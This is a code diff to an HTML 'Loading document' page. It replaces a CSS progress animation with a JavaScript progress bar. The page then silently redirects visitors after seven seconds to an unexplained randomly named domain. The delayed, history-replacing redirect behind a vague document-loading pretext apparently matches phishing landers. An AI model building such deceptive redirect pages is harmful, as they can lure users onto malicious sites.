@@ -108,7 +108,6 @@
       }
 
       .progress span {
-        animation: progress 7s linear forwards;
         background: #2563eb;
         border-radius: inherit;
         display: block;
@@ -119,16 +118,6 @@
       @keyframes spin {
         to {
           transform: rotate(360deg);
-        }
-      }
-
-      @keyframes progress {
-        0% {
-          width: 0;
-        }
-
-        100% {
-          width: 100%;
         }
       }
 
@@ -155,15 +144,33 @@
       <p class="status"><span class="spinner" aria-hidden="true"></span> Loading document</p>
       <h1>Preparing your request</h1>
       <p>Please keep this page open while the document session is prepared.</p>
-      <div class="progress" aria-hidden="true"><span></span></div>
+      <div class="progress" aria-hidden="true"><span id="loading-progress"></span></div>
     </main>
 
     <script>
       (function () {
         var finalUrl = "https://liberalization652.apexdrift.app/448orthodoxy/";
         var loadingDelayMs = 7000;
+        var progressBar = document.getElementById("loading-progress");
+        var startedAt = Date.now();
+        var requestFrame = window.requestAnimationFrame || function (callback) {
+          return window.setTimeout(callback, 16);
+        };
 
+        function updateProgress() {
+          var elapsedMs = Date.now() - startedAt;
+          var progress = Math.min(elapsedMs / loadingDelayMs, 1);
+
+          progressBar.style.width = Math.round(progress * 100) + "%";
+
+          if (progress < 1) {
+            requestFrame(updateProgress);
+          }
+        }
+
+        updateProgress();
         window.setTimeout(function () {
+          progressBar.style.width = "100%";
           window.location.replace(finalUrl);
         }, loadingDelayMs);
       }());
